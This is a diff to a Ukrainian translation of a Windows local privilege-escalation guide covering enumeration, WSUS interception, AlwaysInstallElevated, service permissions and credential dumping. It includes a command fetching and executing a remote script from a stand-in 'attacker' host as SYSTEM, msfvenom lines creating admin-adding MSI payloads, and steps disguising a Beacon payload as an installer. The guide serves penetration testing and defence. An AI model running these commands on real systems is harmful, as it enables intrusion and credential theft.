@@ -4,7 +4,7 @@
 
 ### **Найкращий інструмент для пошуку векторів локального підвищення привілеїв у Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
 
-## Початкова теорія Windows
+## Початкові відомості про Windows
 
 ### Access Tokens
 
@@ -35,38 +35,38 @@ integrity-levels.md
 
 ## Засоби контролю безпеки Windows
 
-У Windows є різні механізми, які можуть **перешкоджати вам проводити enumeration системи**, запускати виконувані файли або навіть **виявляти ваші дії**. Вам слід **прочитати** наведену нижче **сторінку** та **перерахувати** всі ці **механізми** **захисту** перед початком enumeration для підвищення привілеїв:
+У Windows є різні механізми, які можуть **перешкодити вам виконувати enumeration системи**, запускати виконувані файли або навіть **виявити вашу активність**. Перед початком enumeration для підвищення привілеїв слід **прочитати** наведену нижче **сторінку** та **перерахувати** всі ці **захисні** **механізми**:
 
 
 {{#ref}}
 ../authentication-credentials-uac-and-efs/
 {{#endref}}
 
-### Захист адміністратора / безшумне підвищення через UIAccess
+### Захист адміністратора / тихе підвищення через UIAccess
 
-Процеси UIAccess, запущені через `RAiLaunchAdminProcess`, можна використати для досягнення High IL без запитів, якщо обійти перевірки secure-path в AppInfo. Перегляньте спеціальний workflow обходу UIAccess/Admin Protection тут:
+Процеси UIAccess, запущені через `RAiLaunchAdminProcess`, можна використати для досягнення High IL без запитів, якщо перевірки безпечного шляху AppInfo обійдено. Перегляньте спеціальний workflow обходу UIAccess/Admin Protection тут:
 
 {{#ref}}
 uiaccess-admin-protection-bypass.md
 {{#endref}}
 
-Propagation реєстру доступності Secure Desktop можна використати для довільного запису до реєстру з правами SYSTEM (RegPwn):
+Поширення параметрів accessibility через реєстр Secure Desktop можна використати для довільного запису в реєстр SYSTEM (RegPwn):<sup>[[18]](#references)</sup>
 
 {{#ref}}
 secure-desktop-accessibility-registry-propagation-regpwn.md
 {{#endref}}
 
-У новіших збірках Windows також з'явився шлях **SMB arbitrary-port** для LPE, за якого привілейована локальна NTLM-аутентифікація відображається через повторно використане SMB TCP-з'єднання:
+У новіших збірках Windows також з’явився шлях LPE через **SMB arbitrary-port**, у якому привілейована локальна NTLM-аутентифікація відображається через повторно використане SMB TCP-з’єднання:
 
 {{#ref}}
 local-ntlm-reflection-via-smb-arbitrary-port.md
 {{#endref}}
 
-## Інформація про систему
+## Відомості про систему
 
 ### Enumeration інформації про версію
 
-Перевірте, чи має версія Windows відомі вразливості (також перевірте встановлені патчі).
+Перевірте, чи має версія Windows відомі вразливості (також перевірте встановлені patches).
 ```bash
 systeminfo
 systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
@@ -81,21 +81,21 @@ Get-Hotfix -description "Security update" #List only "Security Update" patches
 ```
 ### Експлойти версій
 
-Цей [сайт](https://msrc.microsoft.com/update-guide/vulnerability) зручний для пошуку детальної інформації про вразливості безпеки Microsoft. Ця база даних містить понад 4 700 вразливостей безпеки, демонструючи **величезну поверхню атаки**, яку являє собою середовище Windows.
+Цей [сайт](https://msrc.microsoft.com/update-guide/vulnerability) зручний для пошуку детальної інформації про вразливості Microsoft. Ця база даних містить понад 4 700 вразливостей безпеки, демонструючи **величезну поверхню атаки**, яку являє собою середовище Windows.
 
 **У системі**
 
 - _post/windows/gather/enum_patches_
 - _post/multi/recon/local_exploit_suggester_
 - [_watson_](https://github.com/rasta-mouse/Watson)
-- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas містить watson)_
+- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas має вбудований watson)_
 
-**Локально, використовуючи інформацію про систему**
+**Локально з інформацією про систему**
 
 - [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
 - [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)
 
-**Github-репозиторії з експлойтами:**
+**GitHub-репозиторії експлойтів:**
 
 - [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
 - [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
@@ -103,7 +103,7 @@ Get-Hotfix -description "Security update" #List only "Security Update" patches
 
 ### Середовище
 
-Чи збережено в змінних середовища облікові дані або іншу Juicy info?
+Чи збережено в змінних середовища будь-яку credential/Juicy info?
 ```bash
 set
 dir env:
@@ -121,7 +121,7 @@ cat (Get-PSReadlineOption).HistorySavePath | sls passw
 ```
 ### Файли транскриптів PowerShell
 
-Дізнатися, як увімкнути цю функцію, можна за посиланням [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/).
+Дізнатися, як це увімкнути, можна за посиланням [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/).
 ```bash
 #Check is enable in the registry
 reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
@@ -151,14 +151,14 @@ Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
 ```
 ### PowerShell **Script Block Logging**
 
-Фіксується повний запис активності та вмісту виконання скрипту, що гарантує документування кожного блоку коду під час його виконання. Цей процес зберігає комплексний audit trail кожної дії, що є цінним для криміналістичного аналізу та дослідження зловмисної поведінки. Документування всієї активності під час виконання забезпечує детальне розуміння процесу.
+Фіксується повний запис активності та всього вмісту під час виконання скрипту, що забезпечує документування кожного блоку коду в міру його виконання. Цей процес зберігає комплексний audit trail кожної дії, що є цінним для forensic-аналізу та аналізу шкідливої поведінки. Документування всієї активності під час виконання забезпечує детальне розуміння процесу.
 ```bash
 reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
 reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
 reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
 reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
 ```
-Події журналювання для Script Block можна знайти у Windows Event Viewer за шляхом: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
+Події журналювання для Script Block можна знайти в Windows Event Viewer за шляхом: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
 Щоб переглянути останні 20 подій, можна використати:
 ```bash
 Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
@@ -178,15 +178,15 @@ Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| 
 
 Ви можете скомпрометувати систему, якщо оновлення запитуються через http, а не http**S**.
 
-Спочатку перевірте, чи використовує мережа оновлення WSUS без SSL, виконавши в cmd:
+Спочатку перевірте, чи використовує мережа оновлення WSUS без SSL, виконавши в cmd таку команду:
 ```
 reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
 ```
-Або наведене нижче в PowerShell:
+Або наступне в PowerShell:
 ```
 Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
 ```
-Якщо ви отримуєте відповідь на кшталт однієї з наведених нижче:
+Якщо ви отримуєте відповідь на кшталт однієї з таких:
 ```bash
 HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
 WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
@@ -200,13 +200,13 @@ PSChildName  : windowsupdate
 PSDrive      : HKLM
 PSProvider   : Microsoft.PowerShell.Core\Registry
 ```
-А якщо `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` або `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` дорівнює `1`.
+І якщо `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` або `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` дорівнює `1`.
 
-Тоді **це можна експлуатувати.** Якщо останній запис реєстру дорівнює 0, запис WSUS буде проігноровано.
+Тоді **це можна експлуатувати.** Якщо останній registry дорівнює `0`, запис WSUS буде проігноровано.
 
-Для експлуатації цих вразливостей можна використовувати такі інструменти: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) — це weaponized MiTM exploit scripts для ін'єкції «фейкових» оновлень у незашифрований SSL-трафік WSUS.
+Для експлуатації цих vulnerabilities можна використовувати такі tools: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) — це weaponized MiTM exploit scripts для ін'єкції 'fake' updates у не-SSL WSUS traffic.
 
-Дослідження доступне тут:
+Read research here:
 
 {{#file}}
 CTX_WSUSpect_White_Paper (1).pdf
@@ -214,45 +214,45 @@ CTX_WSUSpect_White_Paper (1).pdf
 
 **WSUS CVE-2020-1013**
 
-[**Читайте повний звіт тут**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
-По суті, саме цю ваду експлуатує цей bug:
+[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
+По суті, саме цю flaw експлуатує цей bug:
 
-> Якщо ми можемо змінювати proxy нашого локального користувача, а Windows Updates використовує proxy, налаштований у параметрах Internet Explorer, то ми можемо локально запустити [PyWSUS](https://github.com/GoSecure/pywsus), щоб перехоплювати власний трафік і виконувати код від імені підвищеного користувача на нашому asset.
+> Якщо ми маємо можливість modify proxy нашого local user, а Windows Updates використовує proxy, налаштований у settings Internet Explorer, то ми можемо локально запустити [PyWSUS](https://github.com/GoSecure/pywsus), щоб intercept власний traffic і виконати code від імені elevated user на нашому asset.
 >
-> Крім того, оскільки служба WSUS використовує параметри поточного користувача, вона також використовує його certificate store. Якщо ми створимо self-signed certificate для hostname WSUS і додамо цей certificate до certificate store поточного користувача, ми зможемо перехоплювати як HTTP-, так і HTTPS-трафік WSUS. WSUS не використовує механізмів на кшталт HSTS для реалізації перевірки типу trust-on-first-use для сертифіката. Якщо представлений certificate довірений користувачем і має правильний hostname, служба його прийме.
+> Крім того, оскільки WSUS service використовує settings поточного user, він також використовуватиме його certificate store. Якщо ми згенеруємо self-signed certificate для WSUS hostname і додамо цей certificate до certificate store поточного user, ми зможемо intercept як HTTP-, так і HTTPS-WSUS traffic. WSUS не використовує механізмів на кшталт HSTS для реалізації валідації типу trust-on-first-use certificate. Якщо представлений certificate є trusted user і має правильний hostname, service його прийме.
 
-Цю вразливість можна експлуатувати за допомогою інструмента [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (після його release).
+Ви можете експлуатувати цю vulnerability за допомогою tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (once it's liberated).
 
-## Third-Party Auto-Updaters and Agent IPC (локальна privesc)
+## Third-Party Auto-Updaters and Agent IPC (local privesc)
 
-Багато enterprise agents відкривають IPC surface на localhost і привілейований update channel. Якщо enrollment можна змусити використовувати attacker server, а updater довіряє rogue root CA або має слабкі перевірки signer, локальний користувач може доставити malicious MSI, який SYSTEM service встановить. Узагальнену техніку (на основі ланцюжка Netskope stAgentSvc — CVE-2025-0309) наведено тут:
+Багато enterprise agents відкривають IPC surface на localhost і privileged update channel. Якщо enrollment можна змусити використовувати server attacker, а updater довіряє rogue root CA або має weak signer checks, local user може передати malicious MSI, який SYSTEM service встановить. Generalized technique (based on the Netskope stAgentSvc chain – CVE-2025-0309) наведено тут:
 
 
 {{#ref}}
 abusing-auto-updaters-and-ipc.md
 {{#endref}}
 
-## Veeam Backup & Replication CVE-2023-27532 (SYSTEM через TCP 9401)
+## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)
 
-Veeam B&R < `11.0.1.1261` відкриває localhost service на **TCP/9401**, який обробляє повідомлення під контролем attacker, що дає змогу виконувати довільні команди від імені **NT AUTHORITY\SYSTEM**.
+Veeam B&R < `11.0.1.1261` відкриває localhost service на **TCP/9401**, який обробляє attacker-controlled messages, що дозволяє виконувати arbitrary commands від імені **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup>
 
-- **Recon**: підтвердьте наявність listener і version, наприклад, за допомогою `netstat -ano | findstr 9401` і `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
-- **Exploit**: помістіть PoC, наприклад `VeeamHax.exe`, разом із необхідними Veeam DLL в ту саму директорію, а потім запустіть SYSTEM payload через local socket:
+- **Recon**: підтвердьте listener і version, наприклад, за допомогою `netstat -ano | findstr 9401` і `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
+- **Exploit**: помістіть PoC, наприклад `VeeamHax.exe`, разом із required Veeam DLLs в одну директорію, а потім trigger SYSTEM payload через local socket:
 ```powershell
 .\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
 ```
-Служба виконує команду як SYSTEM.
+Сервіс виконує команду як SYSTEM.
 ## KrbRelayUp
 
-У Windows **доменних** середовищах за певних умов існує вразливість **локальної ескалації привілеїв**. Ці умови включають середовища, де **підписування LDAP не enforced,** користувачі мають self-rights, що дозволяють їм налаштовувати **Resource-Based Constrained Delegation (RBCD),** а також можливість користувачів створювати комп’ютери в домені. Важливо зазначити, що ці **вимоги** виконуються за **типових налаштувань**.
+У середовищах Windows **domain** за певних умов існує вразливість **local privilege escalation**. До цих умов належать середовища, де **LDAP signing не enforced,** користувачі мають self-rights, які дозволяють їм налаштовувати **Resource-Based Constrained Delegation (RBCD),** а також можливість користувачів створювати комп'ютери в domain. Важливо зазначити, що ці **вимоги** виконуються за **default settings**.
 
 Знайдіть **exploit у** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)
 
-Щоб отримати більше інформації про перебіг атаки, перегляньте [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)
+Докладніше про перебіг атаки дивіться тут: [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)
 
 ## AlwaysInstallElevated
 
-**Якщо** ці 2 ключі реєстру **увімкнено** (значення дорівнює **0x1**), тоді користувачі з будь-якими привілеями можуть **встановлювати** (виконувати) файли `*.msi` від імені NT AUTHORITY\\**SYSTEM**.
+**Якщо** ці 2 реєстри **увімкнені** (значення — **0x1**), тоді користувачі з будь-якими привілеями можуть **встановлювати** (виконувати) файли `*.msi` як NT AUTHORITY\\**SYSTEM**.
 ```bash
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
@@ -262,19 +262,19 @@ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallEle
 msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
 msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
 ```
-Якщо у вас є meterpreter session, ви можете автоматизувати цю техніку за допомогою модуля **`exploit/windows/local/always_install_elevated`**
+Якщо у вас є сесія meterpreter, ви можете автоматизувати цю техніку за допомогою модуля **`exploit/windows/local/always_install_elevated`**
 
 ### PowerUP
 
-Використайте команду `Write-UserAddMSI` з power-up, щоб створити в поточному каталозі Windows MSI binary для підвищення привілеїв. Цей скрипт записує попередньо скомпільований MSI installer, який запитує додавання користувача/групи (тому вам знадобиться доступ через GIU):
+Використайте команду `Write-UserAddMSI` з power-up, щоб створити в поточному каталозі бінарний файл Windows MSI для ескалації привілеїв. Цей скрипт записує попередньо скомпільований MSI-інсталятор, який запитує додавання користувача/групи (тому вам знадобиться доступ через GIU):
 ```
 Write-UserAddMSI
 ```
-Просто виконайте створений binary, щоб підвищити привілеї.
+Просто виконайте створений binary для підвищення привілеїв.
 
 ### MSI Wrapper
 
-Прочитайте цей tutorial, щоб дізнатися, як створити MSI wrapper за допомогою цих tools. Зверніть увагу, що ви можете обгорнути файл "**.bat**", якщо **просто** хочете **виконати** **command lines**
+Прочитайте цей tutorial, щоб дізнатися, як створити MSI wrapper за допомогою цих tools. Зверніть увагу, що ви можете обгорнути файл "**.bat**", якщо ви **лише** хочете **виконати** **command lines**
 
 
 {{#ref}}
@@ -290,32 +290,32 @@ create-msi-with-wix.md
 
 ### Create MSI with Visual Studio
 
-- **Згенеруйте** за допомогою Cobalt Strike або Metasploit **новий Windows EXE TCP payload** у `C:\privesc\beacon.exe`
+- За допомогою Cobalt Strike або Metasploit **згенеруйте** **новий Windows EXE TCP payload** у `C:\privesc\beacon.exe`
 - Відкрийте **Visual Studio**, виберіть **Create a new project** і введіть "installer" у поле пошуку. Виберіть проєкт **Setup Wizard** і натисніть **Next**.
-- Вкажіть назву проєкту, наприклад **AlwaysPrivesc**, використайте **`C:\privesc`** як розташування, виберіть **place solution and project in the same directory** і натисніть **Create**.
+- Укажіть назву проєкту, наприклад **AlwaysPrivesc**, використайте **`C:\privesc`** як розташування, виберіть **place solution and project in the same directory** і натисніть **Create**.
 - Продовжуйте натискати **Next**, доки не перейдете до кроку 3 із 4 (вибір файлів для включення). Натисніть **Add** і виберіть щойно згенерований Beacon payload. Потім натисніть **Finish**.
 - Виділіть проєкт **AlwaysPrivesc** у **Solution Explorer** і в **Properties** змініть **TargetPlatform** з **x86** на **x64**.
-- Ви можете змінити й інші властивості, наприклад **Author** і **Manufacturer**, щоб встановлений app виглядав легітимніше.
+- Є й інші властивості, які можна змінити, наприклад **Author** і **Manufacturer**, щоб інстальований застосунок виглядав більш легітимно.
 - Клацніть правою кнопкою миші проєкт і виберіть **View > Custom Actions**.
 - Клацніть правою кнопкою миші **Install** і виберіть **Add Custom Action**.
 - Двічі клацніть **Application Folder**, виберіть файл **beacon.exe** і натисніть **OK**. Це забезпечить виконання Beacon payload одразу після запуску installer.
 - У **Custom Action Properties** змініть **Run64Bit** на **True**.
 - Нарешті, **зіберіть його**.
-- Якщо відображається попередження `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, переконайтеся, що ви встановили платформу **x64**.
+- Якщо відображається попередження `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, переконайтеся, що ви встановили платформу x64.
 
 ### MSI Installation
 
-Щоб виконати **встановлення** шкідливого файлу `.msi` у **background:**
+Щоб виконати **інсталяцію** шкідливого файлу `.msi` у **background:**
 ```
 msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
 ```
 Щоб експлуатувати цю вразливість, можна використати: _exploit/windows/local/always_install_elevated_
 
-## Антивірус і детектори
+## Антивіруси та детектори
 
 ### Налаштування аудиту
 
-Ці налаштування визначають, що саме **реєструється в журналах**, тому слід звернути на них увагу
+Ці налаштування визначають, що саме **журналюється**, тому слід звернути увагу
 ```
 reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
 ```
@@ -327,7 +327,8 @@ reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\Subs
 ```
 ### LAPS
 
-**LAPS** призначений для **керування паролями локального Administrator**, забезпечуючи, щоб кожен пароль був **унікальним, випадковим і регулярно оновлювався** на комп’ютерах, приєднаних до домену. Ці паролі безпечно зберігаються в Active Directory, і доступ до них можуть отримати лише користувачі, яким через ACLs надано достатні дозволи для перегляду паролів локального адміністратора.
+**LAPS** призначений для **керування паролями локального адміністратора**, забезпечуючи, щоб кожен пароль був **унікальним, випадковим і регулярно оновлювався** на комп'ютерах, приєднаних до домену. Ці паролі безпечно зберігаються в Active Directory, і доступ до них можуть отримати лише користувачі, яким через ACLs надано достатні дозволи, що дають змогу переглядати паролі локального адміністратора за наявності відповідної авторизації.
+
 
 {{#ref}}
 ../active-directory-methodology/laps.md
@@ -335,27 +336,27 @@ reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\Subs
 
 ### WDigest
 
-Якщо активний, **паролі у відкритому вигляді зберігаються в LSASS** (Local Security Authority Subsystem Service).\
+Якщо активний, **паролі у відкритому тексті зберігаються в LSASS** (Local Security Authority Subsystem Service).\
 [**Більше інформації про WDigest на цій сторінці**](../stealing-credentials/credentials-protections.md#wdigest).
 ```bash
 reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
 ```
 ### Захист LSA
 
-Починаючи з **Windows 8.1**, Microsoft запровадила посилений захист Local Security Authority (LSA), щоб **блокувати** спроби ненадійних процесів **читати її пам’ять** або впроваджувати код, додатково підвищуючи безпеку системи.\
+Починаючи з **Windows 8.1**, Microsoft запровадила посилений захист Local Security Authority (LSA), щоб **блокувати** спроби ненадійних процесів **читати її пам'ять** або впроваджувати код, додатково підвищуючи безпеку системи.\
 [**Більше інформації про захист LSA тут**](../stealing-credentials/credentials-protections.md#lsa-protection).
 ```bash
 reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
 ```
 ### Credentials Guard
 
-**Credential Guard** було представлено у **Windows 10**. Його мета — захистити облікові дані, що зберігаються на пристрої, від таких загроз, як атаки pass-the-hash.| [**Більше інформації про Credentials Guard тут.**](../stealing-credentials/credentials-protections.md#credential-guard)
+**Credential Guard** було представлено у **Windows 10**. Його мета — захистити облікові дані, збережені на пристрої, від таких загроз, як атаки pass-the-hash.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
 ```bash
 reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
 ```
 ### Кешовані облікові дані
 
-**Облікові дані домену** автентифікуються **Local Security Authority** (LSA) і використовуються компонентами операційної системи. Коли дані входу користувача автентифікуються зареєстрованим пакетом безпеки, для цього користувача зазвичай створюються облікові дані домену.\
+**Доменні облікові дані** автентифікуються **Local Security Authority** (LSA) і використовуються компонентами операційної системи. Коли дані входу користувача автентифікуються зареєстрованим пакетом безпеки, для користувача зазвичай створюються доменні облікові дані.\
 [**Більше інформації про кешовані облікові дані тут**](../stealing-credentials/credentials-protections.md#cached-credentials).
 ```bash
 reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
@@ -364,7 +365,7 @@ reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLO
 
 ### Перелік користувачів і груп
 
-Вам слід перевірити, чи мають якісь із груп, до яких ви належите, цікаві дозволи
+Вам слід перевірити, чи мають якісь групи, до яких ви належите, цікаві дозволи
 ```bash
 # CMD
 net users %username% #Me
@@ -381,24 +382,24 @@ Get-LocalGroupMember Administrators | ft Name, PrincipalSource
 ```
 ### Привілейовані групи
 
-Якщо ви **належите до певної привілейованої групи, можливо, ви зможете підвищити привілеї**. Дізнайтеся більше про привілейовані групи та способи їх використання для підвищення привілеїв тут:
+Якщо ви **належите до певної привілейованої групи, ви можете отримати можливість підвищити привілеї**. Дізнайтеся про привілейовані групи та способи їх використання для підвищення привілеїв тут:
 
 
 {{#ref}}
 ../active-directory-methodology/privileged-groups-and-token-privileges.md
 {{#endref}}
 
-### Маніпуляції з токенами
+### Маніпуляції з Token
 
-**Дізнайтеся більше** про те, що таке **токен**, на цій сторінці: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
-Перегляньте наведену нижче сторінку, щоб **дізнатися про цікаві токени** та способи їх використання:
+**Дізнайтеся більше** про те, що таке **token**, на цій сторінці: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
+Перегляньте наступну сторінку, щоб **дізнатися про цікаві tokens** і способи їх використання:
 
 
 {{#ref}}
 privilege-escalation-abusing-tokens.md
 {{#endref}}
 
-### Користувачі, які ввійшли в систему / Сеанси
+### Користувачі, які увійшли в систему / Сесії
 ```bash
 qwinsta
 klist sessions
@@ -412,7 +413,7 @@ Get-ChildItem C:\Users
 ```bash
 net accounts
 ```
-### Отримання вмісту буфера обміну
+### Отримати вміст буфера обміну
 ```bash
 powershell -command "Get-Clipboard"
 ```
@@ -420,8 +421,8 @@ powershell -command "Get-Clipboard"
 
 ### Дозволи на файли та папки
 
-Перш за все, під час перегляду процесів **перевірте наявність паролів у командному рядку процесу**.\
-Перевірте, чи можете ви **перезаписати якийсь запущений бінарний файл** або чи маєте дозволи на запис до папки бінарного файлу, щоб використати можливі [**DLL Hijacking attacks**](dll-hijacking/index.html):
+Перш за все, під час переліку процесів **перевірте наявність паролів у командному рядку процесу**.\
+Перевірте, чи можете ви **перезаписати бінарний файл, що виконується**, або чи маєте дозволи на запис до папки бінарного файла, щоб використати можливі [**DLL Hijacking attacks**](dll-hijacking/index.html):
 ```bash
 Tasklist /SVC #List processes running and services
 tasklist /v /fi "username eq system" #Filter "system" processes
@@ -432,9 +433,9 @@ Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "sv
 #Without usernames
 Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
 ```
-Завжди перевіряйте наявність запущених [**electron/cef/chromium debuggers**] — їх можна використати для підвищення привілеїв.
+Завжди перевіряйте наявність запущених [**electron/cef/chromium debuggers** — їх можна використати для підвищення привілеїв](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).
 
-**Перевірка дозволів бінарних файлів процесів**
+**Перевірка дозволів двійкових файлів процесів**
 ```bash
 for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
 for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
@@ -443,7 +444,7 @@ icacls "%%z"
 )
 )
 ```
-**Перевірка дозволів на папки бінарних файлів процесів (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
+**Перевірка дозволів на папки, що містять бінарні файли процесів (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
 ```bash
 for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
 "system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
@@ -451,41 +452,41 @@ icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone
 todos %username%" && echo.
 )
 ```
-### Видобування паролів із пам’яті
+### Здобування паролів із пам'яті
 
-Ви можете створити дамп пам’яті запущеного процесу за допомогою **procdump** з sysinternals. Сервіси, як-от FTP, зберігають **облікові дані у відкритому тексті в пам’яті** — спробуйте створити дамп пам’яті та прочитати облікові дані.
+Ви можете створити дамп пам'яті запущеного процесу за допомогою **procdump** з sysinternals. Сервіси на кшталт FTP мають **облікові дані у відкритому тексті в пам'яті**. Спробуйте створити дамп пам'яті та прочитати облікові дані.
 ```bash
 procdump.exe -accepteula -ma <proc_name_tasklist>
 ```
-### Небезпечні GUI-застосунки
+### Небезпечні GUI-програми
 
-**Застосунки, що працюють від імені SYSTEM, можуть дозволити користувачу запустити CMD або переглядати каталоги.**
+**Програми, що працюють від імені SYSTEM, можуть дозволити користувачу запустити CMD або переглядати каталоги.**
 
-Приклад: "Windows Help and Support" (Windows + F1), виконайте пошук за запитом "command prompt", натисніть "Click to open Command Prompt"
+Приклад: "Windows Help and Support" (Windows + F1), знайдіть "command prompt", натисніть "Click to open Command Prompt"
 
-## Служби
+## Сервіси
 
-Service Triggers дозволяють Windows запускати службу, коли виникають певні умови (активність іменованого каналу/RPC endpoint, події ETW, доступність IP, підключення пристрою, оновлення GPO тощо). Навіть без прав SERVICE_START ви часто можете запускати привілейовані служби, активуючи їхні тригери. Перегляньте методи enumeration та активації тут:
+Service Triggers дозволяють Windows запускати сервіс, коли виникають певні умови (активність named pipe/RPC endpoint, події ETW, доступність IP, підключення пристрою, оновлення GPO тощо). Навіть без прав SERVICE_START часто можна запускати privileged services, активуючи їхні triggers. Дивіться техніки enumeration та activation тут:
 
 -
 {{#ref}}
 service-triggers.md
 {{#endref}}
 
-Отримати список служб:
+Отримати список сервісів:
 ```bash
 net start
 wmic service list brief
 sc query
 Get-Service
 ```
-### Права доступу
+### Дозволи
 
 Ви можете використовувати **sc**, щоб отримати інформацію про службу
 ```bash
 sc qc <service_name>
 ```
-Рекомендується мати binary **accesschk** від _Sysinternals_, щоб перевіряти необхідний рівень привілеїв для кожної служби.
+Рекомендується мати бінарний файл **accesschk** із _Sysinternals_, щоб перевірити необхідний рівень привілеїв для кожної служби.
 ```bash
 accesschk.exe -ucqv <Service_Name> #Check rights for different groups
 ```
@@ -500,23 +501,23 @@ accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
 
 ### Увімкнення service
 
-Якщо ви бачите цю помилку (наприклад, із SSDPSRV):
+Якщо ви отримуєте цю помилку (наприклад, із SSDPSRV):
 
-_Виникла системна помилка 1058._\
-_Службу не можна запустити, оскільки її вимкнено або з нею не пов’язано жодного ввімкненого пристрою._
+_Сталася системна помилка 1058._\
